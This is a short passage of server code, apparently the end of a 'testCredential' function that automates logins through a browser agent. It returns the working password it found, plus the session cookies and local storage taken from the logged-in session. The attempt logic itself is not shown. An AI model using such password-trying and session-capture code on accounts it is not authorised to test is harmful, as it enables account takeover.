    await base44.asServiceRole.entities.AuditLog.create({ target: 'Stagehand', name: 'testCredential', status: 'success', metadata: JSON.stringify({ site_key, username }), timestamp: new Date().toISOString() }).catch(()=>{});
    
    if (finalResults.length === 1) {
      const r = finalResults[0];
      return Response.json({
        status: r.status,
        final_url: r.final_url,
        success_marker_found: r.success_marker_found,
        working_password: r.working_password,
        error_message: r.error_message,
        elapsed_ms: r.elapsed_ms,
        screenshot_url: screenshotUrl,
        session_cookies: r.session_cookies,
        session_local_storage: r.session_local_storage,
      });
    }
    return Response.json({ ...combine(finalResults), screenshot_url: screenshotUrl });
  } catch (error) {
    return Response.json({ status: 'error', error_message: error.message }, { status: 500 });
  }
});